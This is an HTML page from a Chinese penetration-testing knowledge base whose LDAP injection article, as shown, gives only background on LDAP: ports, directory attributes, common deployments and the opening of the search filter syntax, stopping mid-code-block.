<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/WEB漏洞/LDAP注入/README" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">LDAP注入 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/WEB漏洞/LDAP注入/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="LDAP注入 | d4m1ts 知识库"><meta data-rh="true" name="description" content="LDAP简介"><meta data-rh="true" property="og:description" content="LDAP简介"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/LDAP注入/"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/LDAP注入/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/LDAP注入/" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"WEB漏洞","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/"},{"@type":"ListItem","position":3,"name":"LDAP注入","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/LDAP注入/"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.07724ef0.js" defer="defer"></script>
<script src="/assets/js/main.9f1c0106.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="折叠侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/">SQL注入</a><button aria-label="展开侧边栏分类 &#x27;SQL注入&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSS/">XSS</a><button aria-label="展开侧边栏分类 &#x27;XSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/csrf">CSRF</a><button aria-label="展开侧边栏分类 &#x27;CSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSRF/">SSRF</a><button aria-label="展开侧边栏分类 &#x27;SSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/未授权访问">未授权访问</a><button aria-label="展开侧边栏分类 &#x27;未授权访问&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/条件竞争/">条件竞争</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意文件下载:读取/">任意文件下载/读取</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件上传/">文件上传</a><button aria-label="展开侧边栏分类 &#x27;文件上传&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/">文件包含漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/WEB漏洞/LDAP注入/">LDAP注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/命令执行/">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/代码注入/">代码注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SAML测试/">SAML测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/JSONP数据劫持/">JSONP数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CORS跨域数据劫持/">CORS跨域数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CSV注入/">CSV注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSSI/">XSSI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSLT/">XSLT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XS-Leaks/">XS-Leaks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSTI注入/">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/GraphQL测试/">GraphQL安全测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/子域名接管/">子域名接管</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/列目录漏洞/">列目录漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XPATH注入/">XPATH注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/越权漏洞/">越权漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/不安全的反序列化/">不安全的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意URL跳转/">任意URL跳转</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/信息泄漏/">信息泄漏漏洞</a><button aria-label="展开侧边栏分类 &#x27;信息泄漏漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SMTP注入/">SMTP注入</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/逻辑漏洞/">逻辑漏洞</a><button aria-label="展开侧边栏分类 &#x27;逻辑漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CRLF注入/">CRLF注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/web缓存投毒/">WEB缓存投毒</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/漏洞扫描工具/">漏洞扫描工具</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/"><span>WEB漏洞</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">LDAP注入</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>LDAP注入</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ldap简介">LDAP简介<a href="#ldap简介" class="hash-link" aria-label="LDAP简介的直接链接" title="LDAP简介的直接链接">​</a></h2>
<p><strong>LDAP(Lightweight Directory Access Protocol)</strong>：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：<strong>389</strong>， 加密<strong>636</strong>（SSL）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap结构">LDAP结构<a href="#ldap结构" class="hash-link" aria-label="LDAP结构的直接链接" title="LDAP结构的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" src="/assets/images/156497784540567025153-1942dbb164e85b3ea5c10af53341383f.png" width="636" height="341" class="img_ev3q"></p>
<table><thead><tr><th style="text-align:center">属性</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:center">dn（Distinguished Name）</td><td style="text-align:left">一条记录的位置 ，如上图，我们要想描述baby这个节点，描述如下<br><code>cn=baby,ou=marketing,ou=pepple,dc=mydomain,dc=org</code></td></tr><tr><td style="text-align:center">dc(domain compoent)</td><td style="text-align:left">一条记录所属区域 域名部分</td></tr><tr><td style="text-align:center">ou (Organization Unit)</td><td style="text-align:left">一条记录所属组织</td></tr><tr><td style="text-align:center">cn/uid（Common Name）</td><td style="text-align:left">一条记录的名字/ID</td></tr><tr><td style="text-align:center">Entry</td><td style="text-align:left">条目记录数</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用场景">使用场景<a href="#使用场景" class="hash-link" aria-label="使用场景的直接链接" title="使用场景的直接链接">​</a></h3>
<blockquote>
<p>实战中能遇到的主要是 大厂 和 内网</p>
</blockquote>
<p>LDAP服务是许多公司和机构日常操作的关键组成部分，目录服务如微软的<code>Microsoft Active Directory</code>，<code>Novell E-Directory</code>和<code>RedHat Directory</code>服务都基于LDAP协议。不过也有其他的应用和服务会利用LDAP服务，简单是说Windows下在Server 服务器上常用AD，在Linux系统常用的服务是Openldap。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ldap查询语法">LDAP查询语法<a href="#ldap查询语法" class="hash-link" aria-label="LDAP查询语法的直接链接" title="LDAP查询语法的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## search语法</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">attribute operator value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## search filter options:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&amp;&quot;</span><span class="token plain"> or </span><span class="token string" style="color:#e3116c">&quot;|&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filter1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filter2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filter3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;!&quot;</span><span class="token plain"> </span><span class="token punctuation" 